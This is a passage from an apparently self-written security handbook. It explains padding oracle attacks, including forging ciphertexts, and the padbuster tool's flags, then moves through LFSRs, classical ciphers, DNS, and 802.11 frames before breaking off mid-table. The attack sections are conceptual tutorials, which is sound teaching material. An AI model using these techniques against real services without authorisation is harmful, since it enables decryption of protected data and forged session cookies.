<p>A padding oracle attack abuses padding validation information in order to decrypt an arbitrary message. In order for it to work, it requires a <em>padding oracle</em>. A padding oracle is any system which, given a ciphertext, behaves differently depending on whether the decrypted plaintext has valid padding or not. For the sake of simplicity, you can think of it as a sending an arbitrary ciphertext to a server and it returning &quot;Success&quot; when the corresponding plaintext has valid padding, and spitting out &quot;Failure&quot; otherwise. Note that the ciphertexts you query the oracle with need not have meaningful plaintexts behind them and you will not even be generating them by encryption, but rather crafting them in a custom manner in order to exploit the information from the oracle.</p>
<h1 id="how-it-works-1"><a class="header" href="#how-it-works-1">How It Works</a></h1>
<p>Let's remind ourselves of how CBC decryption works by taking a simplified look at the last two blocks:</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Padding_Oracle_Original_Encryption.png" alt="" /></p>
<p>The last ciphertext \( C_2 \) is decrypted with the key \( k \) to an intermediate block \( I_2 \). This intermediate state is then XOR-ed with the penultimate ciphertext block, \( C_1 \), in order to retrieve the plaintext block \( P_2 \). Note, all block here are made from bytes.</p>
<p>Now, let's imagine a second scenario, where \( C_2 \) is kept the same, be we purposefully alter the last byte of \( C_1 \). After this modification, we send the ciphertext to the oracle. Our goal here is to obtain a &quot;success&quot; from it, meaning that it has managed to decrypt the ciphertext we sent it to a plaintext with a valid padding. Since we are only altering the last byte for now, we want to generate a ciphertext which when decrypted will result in a plaintext, whose last byte is <code>0x01</code>.</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Padding_Oracle_C1_Bruteforce.png" alt="" /></p>
<p>Since, we didn't change \( C_2 \), the intermediate \( x_1 \) also remains the same. Additionally, \( y_1 \) is a single byte so it can only take a total of 256 values. This makes it rather easy to brute-force what \( y_1 \) should be, simply by sending queries at max 256 queries to the oracle. Once the oracle returns a &quot;Success&quot;, we have found the right value for \( y_1 \). We can now simply XOR \( y_1 \) with <code>0x01</code> to obtain the value of \( x_1 \), \( x_1 = y_1 \bigoplus \text{0x01} \). </p>
<p>Since \( x_1 \) is the same in both the original and the attack scenario, we can now XOR \( x_1 \) with the original last byte of \( C_1 \) in order to obtain the last byte of the original plaintext! This procedure can be further repeated to obtain the penultimate byte, then the antepenultimate byte and so forth! All that is needed is to find the two bytes at the end of \( C_1 \) that would result in a plaintext ending in <code>0x0202</code>.</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Padding_Oracle_C12_Bruteforce.png" alt="" /></p>
<p>We already know \( x_1 \), so we can obtain the new \( y_1 = x_1 \bigoplus \text{0x02} \). We now only need to brute-force \( y_2 \) with the same technique described above. Once the oracle returns a &quot;Success&quot;, we have found the correct value for \( y_2 \) and can obtain \( x_2 = y_2 \bigoplus \text{0x02} \). Going back to the original scenario, we compute the penultimate byte of the plaintext by XOR-ing the penultimate byte of the unaltered \( C_1 \) with the value of \( x_2 \). Rinse and repeat and you have decrypted the entire plaintext! Note, you will have to reset the procedure from <code>0x01</code> with each new block.</p>
<h1 id="reverse-padding-oracle-attack"><a class="header" href="#reverse-padding-oracle-attack">Reverse Padding Oracle Attack</a></h1>
<p>Apart from allowing you to <em>decrypt</em> a ciphertext, an oracle padding vulnerability can allow you to <em>encrypt</em> (almost) any plaintext. This could be useful for example when you need to encrypt a plaintext cookie to a ciphertext in order to use it, but you don't have the key.</p>
<p>First of all you will need to choose the plaintext you want to encrypt, \( P_n \) and pad it appropriately. Then generate a random block of data. This will be the last ciphertext block \( C_n \). Next, we set \( C_{n-1} \) to be a block of 0s and perform a padding oracle attack the usual way, until we obtain the value of \( C_{n-1} \) for which \( C_n \) decrypts to a full block of padding (in the case of block size 8 this would be <code>0x0808080808080808</code>).</p>
<p>We now XOR these together to obtain \( I_n = \text{0x0808080808080808} \bigoplus C_{n-1} \). Afterwards, XOR the desired plaintext \( P_n \) with the intermediate state \( I_n \) in order to obtain a new value for \( C_{n-1} \) which will force \( C_n \) to be decrypted to the appropriate plaintext. Repeat this process with the rest of the ciphertext blocks, but now use the ultimately obtained \( C_{n-1} \) instead of the randomly generated \( C_n \), and then the next ultimately obtained \( C_{n-i} \), and... ta-da, you have the ciphertext of your desired plaintext. Unfortunately, unless you have control of the IV, the last block will always decrypt to garbage.</p>
<h1 id="padding-oracle-attacks-with-padbuster"><a class="header" href="#padding-oracle-attacks-with-padbuster">Padding Oracle Attacks with <code>padbuster</code></a></h1>
<p><code>padbuster</code> is a tool written in Perl which is designed to automate padding oracle attacks. It is included in Kali Linux, but you can also find it at https://github.com/AonCyberLabs/PadBuster.</p>
<p>Its syntax is fairly simple. You need to first provide it with the URL of the padding oracle, then you need to give it the ciphertext and finally provide it with the block size. Next are any command-line arguments you might wish to use. If you don't provide <code>padbuster</code> with an error string through <code>-error</code>, it will perform response analysis and prompt you to select which response is the error one. For example, I have a padding oracle which displays either &quot;Success!&quot; or &quot;Fail!&quot; on the response page. As you see, though, <code>padbuster</code>'s response analysis automatically picked up on that and asked me which response is the error.</p>
<p>You might also need to change the encoding that <code>padbuster</code> uses, depending on the how the padding oracle accepts data. Here, <code>-encoding 1</code> means that I want the requests to include the malicious ciphertexts representing hex bytes as lowercase ASCII characters. The <code>-noiv</code> flag tells <code>padbuster</code> that the provided ciphertext does NOT include an IV. If you skip it, the first ciphertext block will be treated as the IV and won't be decrypted.</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Padbuster_run.png" alt="" /></p>
<p>After you give it the correct error response, it will perform the attack and decrypt your ciphertext.</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Padbuster_decrypt.png" alt="" /></p>
<p>Furthermore, <code>padbuster</code> is capable of <em>encrypting</em> a plaintext by mounting a reverse padding oracle attack. This is done through the <code>-plaintext [plaintext]</code> flag:</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Padbuster_encrypt.png" alt="" /></p>
<p>Unfortunately, if you don't know the IV, the last block will decrypt to garbage:</p>
<p><img src="Cryptography/Block%20Ciphers/Resources/Images/Padbuster_No_IV_Garbage.png" alt="" /></p>
<p>Note, in the above screenshot the hex is actually the decrypted version of the ciphertext generated by <code>padbuster.</code></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-47"><a class="header" href="#introduction-47">Introduction</a></h1>
<p>Unlike block ciphers, stream ciphers do not fuse plaintext with key bits. Instead, a stream cipher generates a pseudorandom bits from the key and encrypts the plaintext by XOR-ing it with those bits. The pseudorandom bits are said to construct a <em>keystream</em>. In addition to the key, which is usually 128 or 256 bits, a stream cipher also takes a nonce. The nonce need not be secret but should be unique for every key. Nonce sizes are typically between 64 and 128 bits.</p>
<p><img src="Cryptography/Stream%20Ciphers/Resources/Images/Stream_Cipher.png" alt="" /></p>
<p>It is paramount that the same key-nonce pair \( k_1 \), \( n_1 \) is not used for the encryption of multiple messages, since you would then have \( c_1 = p_1 \bigoplus ks \) and \( c_2 = p_2 \bigoplus ks \), so if you know \( p_1 \), you could easily determine \( p_2 = c_1 \bigoplus c_2 \bigoplus p_1 \).</p>
<h1 id="stateful-and-counter-based-stream-ciphers"><a class="header" href="#stateful-and-counter-based-stream-ciphers">Stateful and Counter-Based Stream Ciphers</a></h1>
<p>Stream ciphers can be split into two major categories. <em>Stateful stream ciphers</em> have an internal state which is morphed during the encryption process. The state is first initialised from the key and the nonce. Subsequently, an update function function is invoked which changes the state and produces one or more keystream bits from it. </p>
<p><img src="Cryptography/Stream%20Ciphers/Resources/Images/Stateful_stream_cipher.png" alt="" /></p>
<p>The other type is <em>counter-based stream ciphers</em>. These produce chunks of keystream bits by taking the key, nonce and a counter which changes at every turn.</p>
<p><img src="Cryptography/Stream%20Ciphers/Resources/Images/Counter_Based_Stream_Cipher.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-48"><a class="header" href="#introduction-48">Introduction</a></h1>
<p>Hardware-oriented stream ciphers are designed to be run on <em>dedicated hardware</em>. They typically work on the bit-level, since hardware can be custom-tailored to be more efficient with these operations. Almost all hardware stream ciphers are built upon a concept called <em>feedback shift registers (FSRs).</em></p>
<h1 id="feedback-shift-registers"><a class="header" href="#feedback-shift-registers">Feedback Shift Registers</a></h1>
<p>An FSR is comprised of a bit array, called a <em>register</em>, which is equipped with an update feedback function, denoted as \( f \), which takes a bit array and produces a single bit based on it. Each update alters the register and produces a single output bit. Given a current register state, \( R_i \), the subsequent state will be this:</p>
<p>$$ R_{i+1} = (R_i &lt;&lt; 1) | f(R_i)$$</p>
<p>The current state \( R_i \) is left-shifted by a single position. The bit leaving the register is returned as the output for this update cycle and the bit in the end of the register is filled with \( f(R_i) \).  Here, <code>|</code> denotes the OR operation.</p>
<p>For example, suppose you had a feedback function, \( f \) which simply XOR-ed all the bits of the register. Given an initial state, \( 0101 \), you would have \( f(0101) = 0 \bigoplus 1 \bigoplus 0 \bigoplus 1 = 0 \). The new state would thus be \( (0101 &lt;&lt; 1)|0 = 1010 \).</p>
<p>Given a feedback function \( f \) and an initial state \( R_0 \), we define the <em>period</em> of the FSR to be the number of updates that the FSR can go through until the new state repeats with one of the previous states, thus forming a cycle. Note, that the period of the FSR will be the same if we substituted \( R_0 \) for any other state which is produced during its cycle and any single state may only belong to a single cycle. </p>
<p>With the above function, \( f \), and state, \( 0101 \), the period would be 6.</p>
<p>Naturally, an FSR with a larger period will produce a more unpredictable output.</p>
<h2 id="linear-feedback-shift-registers-lfsr"><a class="header" href="#linear-feedback-shift-registers-lfsr">Linear Feedback Shift Registers (LFSR)</a></h2>
<p>Linear Feedback Shift Registers are FSRs which are equipped with a linear feedback function, namely a procedure which XORs together some of the bits of the current state. The bits that get XOR-ed together are defined by a set of boolean <em>feedback coefficients</em>. It is important that the feedback coefficients are <em>not</em> allowed to mutate throughout any update, since they define the feedback function. The number of bits in the bit array of the register is called its <em>degree</em>.</p>
<p><img src="Cryptography/Stream%20Ciphers/Hardware-Oriented%20Stream%20Ciphers/../Resources/Images/LFSR.png" alt="" /></p>
<p>For a register consisting of bits \( s_{n-1},...,s_0 \) and feedback coefficients \( c_{n-1},...,c_0 \), the state of the LFSR is updated by shifting the register to the right and replacing the left-most bit with the output of the feedback function. Namely, if the register state at time \( t \) is described by \( s_{n-1}^{(t)},...,{}_{t}s_0^{(t)} \), the state after an update (also called a <em>clock tick</em>) would be given by:</p>
<p>$$s_i^{(t+1)} \colon= s_{i+1}^{(t)}, \text{where } i = 0,...,n-2$$
$$s_{n-1}^{(t+1)} \colon= \bigoplus_{i=0}^{n-1} c_i s_i^{(t)}$$</p>
<p>For each clock tick, the LFSR outputs the value of the right-most bit, \( s_0 \). Thus, if the initial state of the LFSR is \( s_{n-1}^{(0)},...,s_0^{(t)} \), then the first \( n \) bits of the output stream will be the sequence \( s_0^{(0)},...,s_{n-1}^{(0)} \), with the next output bit being \( s_{n-1}^{(1)} = \bigoplus_{i=0}^{n-1} c_i s_i^{(0)} \).</p>
<p>The maximal period of an LFSR is \( 2^n-1 \), where \( n \) is the degree of the LFSR, for the all-zeros state can never be mutated via a XOR operation. It is paramount that the correct feedback coefficients are chosen in order to ensure a maximal period. Luckily, there is a procedure for accomplishing just that. Starting from 1 for the left-most bit moving up to \( n \) for the right-most bit, we construct a polynomial of the form \( p(x) = 1 + x + x^2 + x^3 + ... + x^n \), where the term \( x^i \) is only included if the \( i \)th bit has a feedback coefficient equal to 1 (it is included in the XOR operation). Now, the period is maximal if and only if this polynomial is <em>primitive</em>. A polynomial is primitive when it is irreducible (factorisation is impossible) and also satisfies additional mathematical criteria, which I unfortunately do not comprehend myself, but you can read more about them <a href="https://en.wikipedia.org/wiki/Primitive_polynomial_(field_theory)">here</a>.</p>
<p>LFSRs are inherently insecure due to their linearity. Given known feedback coefficients, the first \( n \) output bits will reveal the initial state and from then on it is possible to determine the entirety of all future bits. Even with unknown feedback coefficients, an attacker needs at most \( 2n \) output bits to determine both the feedback coefficients and the initial state. If we denote the first \( n \) output bits as \( y_0,...,y_{n-1} \) and the next \( n \) bits as \( y_n,...,y_{2n-1} \), we can construct the following system of linear equations:</p>
<p>$$\begin{align}
y_n &amp;= c_{n-1} y_{n-1} \bigoplus \cdots \bigoplus c_0 y_0 \newline
\vdots \newline 
y_{2n-1} &amp;= c_{n-1} y_{2n-2} \bigoplus \cdots \bigoplus c_0 y_{n-1} 
\end{align}$$</p>
<p>It is possible to show that for a maximal period LFSR the equations in the system are linearly independent (\( \mod 2 \)) and can be solved through basic linear algebra.</p>
<h2 id="introducing-nonlinearity"><a class="header" href="#introducing-nonlinearity">Introducing Nonlinearity</a></h2>
<p>LFSRs can be strengthen by introducing nonlinearity in the encryption process by different means. This means that it is not only XOR operations that are used, but also logical ANDs and ORs. For example, it is possible to make the feedback loop nonlinear by setting the value of the leftmost bit at each clock tick to be a nonlinear function of the bits in the previous state. If the register's state at time \( t \) is \( s_{n-1}^{(t)},...,s_0^{(t)} \), the state at \( t+1 \) would be</p>
<p>$$s_i^{(t+1)} \colon= s_{i+1}^{(t)}, \text{where } i = 0,...,n-2$$
$$s_{n-1}^{(t+1)} \colon= g(s_{n-1}^{(t)},...,s_0^{(t)})$$</p>
<p>As before, the rightmost bit, \( s_0 \) is outputted at each clock tick. In order for the FSR to be secure, the feedback function, \( g \) should be balanced in the sense that \( \text{Pr}[g( s_{n-1},...,s_0 ) = 1] \approx \frac{1}{2} \). </p>
<p><img src="Cryptography/Stream%20Ciphers/Hardware-Oriented%20Stream%20Ciphers/../Resources/Images/NFSR.png" alt="" /></p>
<p>Unfortunately, there is a downside to NFSRs (Nonlinear FSRs). There is no efficient way to determine an NFSR's period or even whether its period is maximal. It is however, possible to mitigate this by combining NFSRs and LFSRs, which is what <a href="Cryptography/Stream%20Ciphers/Hardware-Oriented%20Stream%20Ciphers/Grain-128a.html">Grain-128a</a> does.</p>
<h3 id="filtered-fsrs"><a class="header" href="#filtered-fsrs">Filtered FSRs</a></h3>
<p>In the above example, the FSR itself is nonlinear, since the way that the leftmost is altered at each clock tick is determined by a nonlinear function. However, it is also possible to keep the FSR linear and instead pass its output to a filter function, \( g \). Instead of outputting the rightmost bit, \( s_0 \), the entire register is passed to the filter function and the output of the register is determined by the output of \( g \).</p>
<p><img src="Cryptography/Stream%20Ciphers/Hardware-Oriented%20Stream%20Ciphers/../Resources/Images/Filtered_FSR.png" alt="" /></p>
<p>Whilst filtered FSRs are stronger than LFSRs, their underlying partial linearity makes them vulnerable to complex attacks such as <em>algebraic attacks</em>, <em>cube attacks</em>, and <em>fast correlation attacks</em>.</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="the-shift-cipher"><a class="header" href="#the-shift-cipher">The Shift Cipher</a></h1>
<p>One of the oldest known ciphers is known as Caesar's cipher. Julius Caesar encrypted his messages by shifting every letter of the alphabet three spaces forward and looping back when the end of the alphabet is reached. Consequently, <code>A</code> would be mapped to <code>D</code> and <code>Z</code> would be mapped to <code>C</code>.</p>
<p>An immediate problem with this cipher is the lack of a key - the shift amount is always the same. A natural extension of the cipher would then be to let the shift amount vary, turning it into a key whose possible values are the numbers between 0 and 25. Therefore, the key space is  \( K \equiv \{ 0, ..., 25 \} \).</p>
<p>An encryption algorithm \( Enc_k \) would take a plaintext \( m \), shift its letters forwards by \( k \) positions and spit out a ciphertext \( c \). In contrast, a decryption algorithm \( Dec_k \) would take the ciphertext \( c \) and shift its letters <em>backwards</em> by \( k \) places to retrieve the original plaintext. If we map the alphabet to the set \( {0,...,25} \) (\( a = 0, b = 1 \), etc.), a more mathematical description is obtained. Encryption of any message \( m = m_1 \cdot\cdot\cdot m_l \) (\( m_i \in {0,...,25} \)) using the key \( k \) is given by</p>
<p>$$Enc_k (m_1 \cdot\cdot\cdot m_l) = c_1 \cdot\cdot\cdot c_l, \hspace{1cm} where \hspace{1mm} c_i = [(m_i + k) \mod 26]$$</p>
<p>The notation \( [a \mod N] \) is the remainder of \( a \) upon division by \( N \) where \( 0\leq[a \mod N] &lt; N \) and \( \cdot\cdot\cdot \) denotes concatenation and not multiplication. Decryption of a cyphertext \( c = c_1 \cdot\cdot\cdot c_l \) using a key \( k \) would then be given by </p>
<p>$$Dec_k (c_1 \cdot\cdot\cdot c_l) = m_1 \cdot\cdot\cdot m_l, \hspace{1cm} where \hspace{1mm} m_i = [(c_i - k) \mod 26]$$</p>
<p>It is only natural to now ask, is this cipher secure? And the simple answer is no. There are only 26 possible keys and so the key-space is not sufficiently big. You can even go through all 26 possible keys with a given ciphertext by hand and check which resulting plaintext makes sense. Most likely, there will be only one and so you would have recovered the original message.</p>
<p>Another method to crack this cipher is by using frequency analysis. Since the shift cipher is a one-to-one mapping on a letter-by-letter basis, the frequency distribution of letters is preserved. For example, the most common letter in English is the letter &quot;e&quot;. If we analyse the ciphertext and discover that the most common letter there is &quot;g&quot;, then we know that most likely the letter &quot;g&quot; is the letter &quot;e&quot; encrypted with the given key. From this we can calculate the key to be 2 (however, the plaintext, and therefore the ciphertext, may actually deviate from this distribution, so it is not with 100% certainty that the key is 2). We can also perform the same procedure with the rest of the letters in the ciphertext and retrieve the original plaintext. This process can also be automated with some math.</p>
<p><img src="Cryptography/Resources/Images/English_Letter_Frequency_Table.png" alt="" /></p>
<p>Let's once again map the alphabet with the integers 0 through 25 and also this time let \( p_i \) (\( 0 \leq p_i \leq 1 \)) denote the frequency of the \( i \)th letter. Using the above table, we can calculate that</p>
<p>$$ \sum_{i=0}^{25} p_i^2 \approx 0.065$$</p>
<p>Now, let \( q_i \) denote the frequency of the \( i \)th letter in the ciphertext - this is just equal to the number of occurrences of the \( i \)th letter divided by the length of the ciphertext. If the key is \( k \), then \( p_i \) should be approximately equal to \( q_{i+k} \), since the \( i \)th letter gets mapped to the \( (i+k) \)th letter (technically, these should be \( i+k \mod 26 \), but that's too cumbersome to write here). Therefore, if we compute</p>
<p>$$ I_j \overset{\mathrm{def}}{=} \sum_{i=0}^{25} p_i \cdot q_{i+j}$$</p>
<p>for every value of \( j \in \{0,...,25\} \), then \( I_k \) should be approximately equal to 0.065, where \( k \) is the actual key. For all \( j \neq k \), \( I_j \) would be different from 0.065. This ultimately leads to a way to recover the original key that is fairly easy to automate.</p>
<h1 id="the-vigenère-cipher"><a class="header" href="#the-vigenère-cipher">The Vigenère Cipher</a></h1>
<p>This cipher is a more advanced version of the shift cipher. It is a <em>poly-alphabetic</em> shift cipher. Unlike the previous ciphers, it does not define a fixed mapping on a letter-by-letter basis. Instead, it maps blocks of letters whose size depends on the key length. For example, <code>ab</code> could be mapped to <code>xy</code>, <code>ac</code> to <code>zt</code>, and <code>aa</code> to <code>bc</code>. Moreover, identical blocks will be mapped to different blocks depending on their relative position in the plaintext. <code>ab</code> could once be mapped to <code>xy</code>, but then when <code>ab</code> appears again, it may be mapped to <code>ci</code>.</p>
<p>In the Vigenère cipher the key is no longer a single number, but rather a string of letters, where each letter is again mapped to the integers \( \{0,...,25\} \). The key is then repeatedly overlaid with the plaintext and each letter in the plaintext is shifted by the amount denoted by the key letter it has been matched with.</p>
<pre><code>Plaintext:  the golden sun shone brightly, bathing the beach in its warm sunlight
Key:        cok ecokec oke cokec okecokec, okecoke cok ecoke co kec okec okecokec
Ciphertext: vvo kqznip ger uvyrg pbmivdpa, pkxjwxk vvo fgoml kb sxu kkvo gernwqlv
</code></pre>
<p>Given a known key length, also called a period, \( t \), a ciphertext \( c = c_1 \cdot\cdot\cdot c_l \) can be divided into parts, each with length \( t \). Therefore, ciphertext characters with the same relative position in each of these groups with length \( t \) would have all been encrypted using the same shift amount. In the above example, for the groups <code>theg</code> and <code>olde</code>, <code>t</code> and <code>o</code> would have both been encrypted with <code>c</code>, <code>h</code> and <code>l</code> with <code>o</code> and so on. Such characters are said to comprise a <em>stream</em>. Stated in a more mathematical way, for all \( j \in \{1,...,t\} \), the ciphertext characters \( c_j,c_{j+t},c_{j+2t},... \) have all been encrypted by shifting the corresponding plaintext character by \( k_j \) positions, where \( k_j \) is the \( j \)th character in the key \( k \). It is now possible to use frequency analysis on each stream and check what shift amount yields the correct probability distribution.</p>
<p>If the period \( t \) is not known, it may be possible to determine it by using Kasiski's method. Initially, you must identify repeated patterns of length 2-3 characters. Kasiski observed that the distance between these repeated patterns (given that they are not coincidental) is a multiple of the period \( t \). In the above example, the distance between the two <code>vvo</code>s is 32 which is 8 times the period 4. </p>
<p>There is also a more automatable (if this is even a word) approach. Recall that, given a period \( t \), the ciphertext characters in the first stream 
$$c_1,c_{1+t},c_{1+2t},...$$
are the upshot of encrypting the corresponding plaintext characters with the same shift amount. Therefore, the frequencies of the characters in the stream will be close to the character frequencies in the English language in some shifted order. </p>
<p>If we let \( q_i \) denote the observed frequency of the \( i \)th letter in the stream (\( q_i = \frac{\text{number of occurrences of the ith letter of the alphabet}}{\text{length of the stream}} \)), we would expect that \( q_{i+j \mod 26} \approx p_i \), where \( j \) is the shift amount and \( p_i \) is the frequency of the \( i \)th letter of the alphabet in a standard English text. Therefore, the sequence \( q_0,q_1,...q_{25} \) is simply the sequence \( p_0,p_1,...,p_{25} \) shifted by \( j \).</p>
<p>Referring back to previous analysis, we get that </p>
<p>$$\sum_{i=0}^{25}q_i^2=\sum_{i=0}^{25}p_i^2 \approx 0.065$$
We can easily find the period \( t \). For every \( \tau =1,2,... \) and the stream \( c_1,c_{1+\tau},c_{1+2\tau},... \) we can define</p>
<p>$$S_{\tau} \overset{\mathrm{def}}{=} \sum_{i=0}^{25}q_i^2$$</p>
<p>When \( \tau=t \), it is expected that \( S_{\tau} \approx 0.065 \). In the rest of the cases, we would expect that the character distribution in the stream is fairly uniform (recall that the Vigenère cipher smooths out character distributions) and so </p>
<p>$$S_{\tau} = \sum_{i=0}^{25} \left(\frac{1}{26}\right)^2 \approx 0.038$$
Ergo, the smallest value \( \tau \), for which \( S_{\tau} \approx 0.065 \), is likely the period \( t \). This can be further validated by performing the same procedure on the subsequent streams in the ciphertext such as \( c_2,c_{2+\tau},c_{2+2\tau},... \) and so on.</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="networking"><a class="header" href="#networking">Networking</a></h1>
<p>Computer networking refers to the study, management, and organisation of computer networks.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-49"><a class="header" href="#introduction-49">Introduction</a></h1>
<p>A computer network is a network which allows for the exchange of resources and information between devies connected to the network. These device span a range of types, sizes, and functions. </p>
<h1 id="network-devices"><a class="header" href="#network-devices">Network Devices</a></h1>
<h2 id="switch"><a class="header" href="#switch">Switch</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-50"><a class="header" href="#introduction-50">Introduction</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dns-1"><a class="header" href="#dns-1">DNS</a></h1>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-51"><a class="header" href="#introduction-51">Introduction</a></h1>
<p>Computers connected to the Internet have a numerical identifier - called an Internet Protocol Address (IP Address) - which is used to communicate with this machine. However, remembering a 32-bit number for each computer you want to connect to - even if it's formatted nicely into four separate sections - isn't practical at all. As such, a systematic way of resolving this issue was a created - a sort of lookup table for IP addresses, known as the Domain Name System.</p>
<h1 id="what-is-the-dns"><a class="header" href="#what-is-the-dns">What is the DNS?</a></h1>
<p>The Domain Name System (or DNS for short) is a decentrialised database which provides answers to queries for <em>domain names</em>. Such a query is for example &quot;What is the IP address of google.com? &quot; When such a request is sent out, it will go through the DNS and eventually return with an IP address (if such was found). This saves the average user from having to remember a myriad different IPs for each website they want to visit.</p>
<h1 id="the-dns-hierarchy"><a class="header" href="#the-dns-hierarchy">The DNS Hierarchy</a></h1>
<p>The DNS utilises a hierarchical structure for both storing and serving requested information.</p>
<p><img src="Networking/Protocols/Domain%20Name%20System%20(DNS)/../../Resources/Images/DNSHierarchy.png" alt="" /></p>
<p>At the top of the hierarchy are positioned the root name servers. These store and serve information about the top-level domains (TLDs) such as <code>.net</code>, <code>.com</code>, and <code>.org</code>. The TLD servers provide information about domains which use their corresponding TLD - <code>.com</code> servers contain information about domains such as <code>google.com</code> or <code>duckduckgo.com</code>. They won't give you the IP addresses for these hosts, but will instead point you in the right direction - to another DNS server. </p>
<p>The DNS can be thought of as a file system - one where the addresses are read from right to left and instead of forwards slashes, dots are used. The root is represented by a single dot (.), which is usually not visible. Next follow the top-level domains - similar to directories. Going further, we get second level domains and then subdomains, followed by hosts.</p>
<h1 id="dissecting-a-basic-dns-query"><a class="header" href="#dissecting-a-basic-dns-query">Dissecting a Basic DNS Query</a></h1>
<p>Typing a domain name - such as <code>google.com</code> - into your browser will cause your operating system to attempt to resolve that domain name, or in other words - determine its IP address. It will first check locally for an answer as this is the fastest option. It will look into the local cache and the <code>/etc/hosts</code> file (on UNIX-like system, or <code>C:\Windows\System32\drivers\etc\hosts</code> on Windows). If an answer is not found, the DNS request will be forwarded to your DNS server, which will usually be your home router. Your DNS server may have the answer cached because someone on your network recently queried the same domain. If not, the DNS server will contain an IP address for another name server where you can forward your request - for example the DNS server at your ISP. It's very unlikely that your ISP's name server won't have a cached answer, given the amount of queries that constantly go through it. However, if this happens to be the case, the ISP's name server will carry out further requests on your behalf - exactly how your router forwards the query to your ISP's name server. Name servers can be configured to perform such lookups recursively or not. </p>
<p>If your ISP's name server does not know the IP for the server responsible for <code>.com</code> domains, it will ask one of the 13 root name servers, which are designated with the letters A through M). In reality, there are more than 13 physical machines handling these requests. More information about the root name servers you can find <a href="https://www.iana.org/domains/root/servers">here</a>.</p>
<p>This process will continue until you are forwarded to the name server responsible for the domain you are looking for. This name server will provide you with the IP address of your desired domain, which will be cached, allowing quicker access later.</p>
<h1 id="zones-and-authority"><a class="header" href="#zones-and-authority">Zones and Authority</a></h1>
<p>Some name servers are authoritative in a particular subsection of the DNS - they answer queries only for domains in a particular space. Only one name server, known as the <em>Start of Authority (SOA)</em> could give a decisive answer for a particular query. Other name servers may have the answer cached, but only if they have previously requested it in the span of the time-to-live (TTL).</p>
<p>For example, the SOA for <code>google.com</code> is only responsible for domains in the <code>google.com</code> space. The spaces or <em>name spaces</em> within the DNS are usually referred to as <em>zones of authority</em> or simply <em>zones</em>.
In reality, there is usually more than a single name server for a big company like Google, however, they both do the same job and are considered the SOA. Their names usually go ns1, ns2, and so forth. Should one name server go offline, the next one would take its place in processing queries.</p>
<h1 id="dns-resource-records"><a class="header" href="#dns-resource-records">DNS Resource Records</a></h1>
<p>I already mentioned that the DNS is similar to a database - one split up and stored around the globe. The entries in this database are called <em>resource records</em> and are usually stored in a flat-file format. Resource records do not only store IP addresses and hostnames - they contain other useful information, as well. These are the most common different types of resource records (a complete list can be found <a href="https://en.wikipedia.org/wiki/List_of_DNS_record_types">here</a>):</p>
<ul>
<li><strong>Address of Host (A)</strong> - the IPv4 address of the host</li>
<li><strong>Address of Host (AAAA)</strong> - the IPv6 address of the host</li>
<li><strong>Canonical Name (CNAME)</strong> - also an alias; two domains might point to the same place, in which case, one would be an alias. Querying the domain in this server will result in the A record.</li>
<li><strong>Mail Exchanger (MX)</strong> - refers to a mail server and can contain either an IP address or a hostname</li>
<li><strong>Name Server (NS)</strong> - contains the name server information for a given zone</li>
<li><strong>Start of Authority (SOA)</strong> - found at the beginning of every zone file, this record is bigger than others and stores the primary name server for the zone, including some other information</li>
<li><strong>Pointer (PTR)</strong> - used for reverse DNS lookups - finding the hostname by providing an IP address</li>
<li><strong>Text (TXT)</strong> - a simple text record used for adding extra functionality to DNS and storing miscellaneous information. Sometimes used by administrators for leaving humand-readable notes.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><p>This is a special domain used for reverse DNS lookups. In the <code>in-addr.arpa</code> domain, IP addresses are represented as a sequence of four decimal numbers separated by dots. The suffix of <code>in-addr.arpa</code> is appended to the IP address. In this domain, however, IP address octets are read from right to left, but the contents of the octets are not. For example, in order to do a reverse lookup on <code>172.217.169.174</code>, you would use <code>174.169.217.172.in-addr.arpa</code>. This domain is used for reverse lookups on IPv4 addresses. </p>
<p>For IPv6 addresses, the <code>ip6.arpa</code> domain is used. The address is represented by hex digits in reverse order - each digit looking like a domain name. For example, to do a reverse look up on <code>2001:db8::567:89ab</code>, you would use <code>b.a.9.8.7.6.5.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.8.b.d.0.1.0.0.2.ip6.arpa</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-52"><a class="header" href="#introduction-52">Introduction</a></h1>
<p>The IEEE 802.11 standard defines the structure of datalink frames in wireless networks. These frames have a more complicated structure than <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/../Ethernet%20(IEEE%20802.3).html">Ethernet</a> ones.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Resources/Images/WLAN_Frame.svg" alt="" /></p>
<p>The existence of the last 6 fields in the MAC header is contingent on the type of the frame.</p>
<h2 id="frame-control"><a class="header" href="#frame-control">Frame Control</a></h2>
<p>The Frame Control is a 2-byte field, subdivided into 11 subfields, which carries information about the WiFi frame, including its type. </p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Resources/Images/WLAN_Frame_Control.svg" alt="" /></p>
<p>The <code>Protocol Version</code> is 2 bits long and is set to 00 for PV0 (WLAN) or to 01 for PV1 (802.11ah). The revision level is incremented only when there is a fundamental incompatibility between two versions of the standard.</p>
<p>The Type is a 2-bit field which indicates the type of the frame. There are three main times of frames in 802.11 and the values corresponding to each type are the following:</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Value</th><th style="text-align: center">Type</th></tr></thead><tbody>
<tr><td style="text-align: center"><code>00</code></td><td style="text-align: center">Management</td></tr>
<tr><td style="text-align: center"><code>01</code></td><td style="text-align: center">Control</td></tr>
